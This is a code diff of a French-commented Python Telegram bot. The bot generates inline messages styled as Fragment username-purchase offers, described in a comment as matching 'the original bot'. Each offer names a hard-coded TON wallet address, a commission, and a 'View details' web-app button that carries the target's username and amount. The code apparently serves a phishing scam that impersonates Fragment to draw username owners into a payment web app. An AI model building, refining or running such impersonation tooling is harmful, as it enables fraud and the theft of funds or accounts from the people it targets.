@@ -37,35 +37,21 @@ def get_ton_price():
             return price
     except Exception as e:
         print(f"❌ Erreur API CoinGecko: {e}")
-        # Fallback vers DIA API
-        try:
-            url = "https://api.diadata.org/v1/assetQuotation/Ton/0x0000000000000000000000000000000000000000"
-            with urllib.request.urlopen(url, timeout=5) as response:
-                data = json.loads(response.read().decode())
-                price = float(data.get('Price', 5.50))
-                print(f"💰 Prix TON (fallback): ${price:.4f}")
-                return price
-        except Exception as e2:
-            print(f"❌ Erreur API DIA: {e2}")
-            # Prix par défaut si toutes les APIs échouent
-            return 5.50
+        return 5.50
 
 def generate_fragment_message(username, ton_amount):
     """Génère le message Fragment avec formatage identique au bot original"""
     try:
-        print(f"🔧 DEBUG: Début génération pour {username} - {ton_amount} TON")
+        print(f"🔧 Génération pour {username} - {ton_amount} TON")
         
-        # Prix TON actuel - récupération en temps réel
+        # Prix TON actuel
         ton_price = get_ton_price()
-        print(f"🔧 DEBUG: Prix TON récupéré: {ton_price}")
         
         # Calculs
         price = float(ton_amount)
         price_usd = price * ton_price
         commission = price * 0.05
         commission_usd = commission * ton_price
-        
-        print(f"🔧 DEBUG: Calculs - Price: {price}, USD: {price_usd}, Commission: {commission}")
         
         # Adresse wallet
         wallet_address = "UQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XDPR"
@@ -87,165 +73,85 @@ Important:
 • Please proceed only if you are willing to transform your username into a collectible. This action is irreversible.
 • If you choose not to proceed, simply ignore this message."""
 
-        print(f"🔧 DEBUG: Message généré, longueur: {len(fragment_message)}")
+        # URL avec paramètres pour la web app
+        webapp_url_with_params = f"{WEBAPP_URL}?username={username}&amount={ton_amount}"
         
-        # Entités de formatage  
-        entities = [
-            MessageEntity(
-                type=MessageEntity.BOLD, 
-                offset=fragment_message.find("• Offer Amount:"), 
-                length=15
-            ),
-            MessageEntity(
-                type=MessageEntity.BOLD, 
-                offset=fragment_message.find("• Commission:"), 
-                length=13
-            ),
-            MessageEntity(
-                type=MessageEntity.BOLD, 
-                offset=fragment_message.find("Additional Information:"), 
-                length=23
-            ),
-            MessageEntity(
-                type=MessageEntity.BOLD, 
-                offset=fragment_message.find("Important:"), 
-                length=10
-            )
-        ]
-        
-        # Bouton "View details" - exactement comme dans le code original
+        # Bouton "View details" avec les paramètres
         keyboard = InlineKeyboardMarkup([
-            [InlineKeyboardButton("View details", web_app=WebAppInfo(url=WEBAPP_URL))]
+            [InlineKeyboardButton("View details", web_app=WebAppInfo(url=webapp_url_with_params))]
         ])
         
-        print(f"✅ DEBUG: Message Fragment généré avec succès pour {username}")
-        return fragment_message, entities, keyboard
+        print(f"✅ Message généré pour {username} avec URL: {webapp_url_with_params}")
+        return fragment_message, keyboard
         
     except Exception as e:
-        print(f"❌ DEBUG: Erreur dans generate_fragment_message: {e}")
-        import traceback
-        print(f"❌ DEBUG: Traceback: {traceback.format_exc()}")
+        print(f"❌ Erreur génération: {e}")
         raise e
 
 async def inline_query_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Gestionnaire des requêtes inline"""
-    print(f"🔍 DEBUG: inline_query_handler appelé")
-    
     try:
         from telegram import InlineQueryResultArticle, InputTextMessageContent
         
         query = update.inline_query.query.strip() if update.inline_query.query else ""
-        print(f"🔍 DEBUG: Requête reçue: '{query}'")
+        print(f"🔍 Requête: '{query}'")
         
-        # Si pas de requête ou format incorrect - ne rien afficher (bot privé)
+        # Si pas de requête - ne rien afficher
         if not query:
-            print(f"🔍 DEBUG: Pas de query, envoi liste vide")
             await update.inline_query.answer([], cache_time=0)
             return
         
-        # Parsing de la requête (username montant)
+        # Parsing (username montant)
         parts = query.split()
-        print(f"📝 DEBUG: Parties parsées: {parts}")
         
-        # Si format incorrect - ne rien afficher (bot privé)
+        # Si format incorrect - ne rien afficher
         if len(parts) < 2:
-            print(f"🔍 DEBUG: Format incorrect, envoi liste vide")
             await update.inline_query.answer([], cache_time=0)
             return
         
-        username = parts[0].replace('@', '')  # Supprime @ si présent
-        print(f"📝 DEBUG: Username extrait: '{username}'")
+        username = parts[0].replace('@', '')
         
         try:
             ton_amount = float(parts[1])
             if ton_amount <= 0:
-                raise ValueError("Montant doit être positif")
-            print(f"📝 DEBUG: Montant validé: {ton_amount}")
-        except ValueError as ve:
-            print(f"📝 DEBUG: Erreur validation montant: {ve}")
-            # Ne rien afficher (bot privé)
+                raise ValueError("Montant invalide")
+        except ValueError:
             await update.inline_query.answer([], cache_time=0)
             return
         
-        print(f"✅ DEBUG: Paramètres validés: '{username}' - {ton_amount} TON")
+        print(f"✅ Paramètres validés: {username} - {ton_amount} TON")
         
-        # ÉTAPE CRITIQUE - Génération du message
-        print(f"🔧 DEBUG: Appel de generate_fragment_message...")
+        # Génération du message
         try:
-            fragment_message, entities, keyboard = generate_fragment_message(username, ton_amount)
-            print(f"✅ DEBUG: generate_fragment_message terminé avec succès")
-        except Exception as gen_error:
-            print(f"❌ DEBUG: Erreur dans generate_fragment_message: {gen_error}")
-            import traceback
-            print(f"❌ DEBUG: Traceback génération: {traceback.format_exc()}")
+            fragment_message, keyboard = generate_fragment_message(username, ton_amount)
             
-            # Ne rien afficher en cas d'erreur (bot privé)
-            await update.inline_query.answer([], cache_time=0)
-            return
-        
-        # Prix pour affichage
-        try:
+            # Prix pour l'affichage
             current_ton_price = get_ton_price()
             current_usd_value = ton_amount * current_ton_price
-            print(f"💰 DEBUG: Prix final - {ton_amount} TON = ${current_usd_value:.2f}")
-        except Exception as price_error:
-            print(f"💰 DEBUG: Erreur prix: {price_error}")
-            current_ton_price = 5.50
-            current_usd_value = ton_amount * current_ton_price
-        
-        # ÉTAPE CRITIQUE - Création du résultat inline
-        print(f"📤 DEBUG: Création du résultat inline...")
-        try:
-            result_id = f"deal_{username}_{ton_amount}_{int(time.time())}"
-            print(f"📤 DEBUG: ID résultat: {result_id}")
             
+            # Création du résultat
             results = [
                 InlineQueryResultArticle(
-                    id=result_id,
+                    id=f"deal_{username}_{ton_amount}_{int(time.time())}",
                     title=f"Fragment Deal: @{username}",
                     description=f"💎 {ton_amount:g} TON (${current_usd_value:.2f} USD)",
                     input_message_content=InputTextMessageContent(
                         fragment_message,
-                        entities=entities,
                         disable_web_page_preview=True
                     ),
                     reply_markup=keyboard
                 )
             ]
             
-            print(f"📤 DEBUG: Résultat créé, envoi en cours...")
             await update.inline_query.answer(results, cache_time=0)
-            print(f"✅ DEBUG: Réponse inline envoyée avec succès: {username} - {ton_amount} TON")
-        
-        except Exception as result_error:
-            print(f"❌ DEBUG: Erreur création résultat: {result_error}")
-            import traceback
-            print(f"❌ DEBUG: Traceback résultat: {traceback.format_exc()}")
+            print(f"✅ Résultat envoyé: {username} - {ton_amount} TON")
             
-            # Fallback ultra simple mais toujours fonctionnel
-            try:
-                fallback_results = [
-                    InlineQueryResultArticle(
-                        id=f"simple_{username}_{ton_amount}",
-                        title=f"Fragment Deal: @{username}",
-                        description=f"💎 {ton_amount:g} TON",
-                        input_message_content=InputTextMessageContent(
-                            f"Fragment Deal Request\nUsername: @{username}\nAmount: 💎{ton_amount:g} TON"
-                        )
-                    )
-                ]
-                await update.inline_query.answer(fallback_results, cache_time=0)
-                print("📤 DEBUG: Fallback simple envoyé avec succès")
-            except Exception as fallback_error:
-                print(f"❌ DEBUG: Même le fallback a échoué: {fallback_error}")
-                # En dernier recours, liste vide
-                await update.inline_query.answer([], cache_time=0)
+        except Exception as e:
+            print(f"❌ Erreur génération: {e}")
+            await update.inline_query.answer([], cache_time=0)
         
     except Exception as e:
-        print(f"❌ DEBUG: Erreur critique dans inline_query_handler: {e}")
-        import traceback
-        print(f"❌ DEBUG: Traceback critique: {traceback.format_exc()}")
-        # En cas d'erreur critique, liste vide
+        print(f"❌ Erreur handler: {e}")
         await update.inline_query.answer([], cache_time=0)
 
 class WebhookHandler(BaseHTTPRequestHandler):
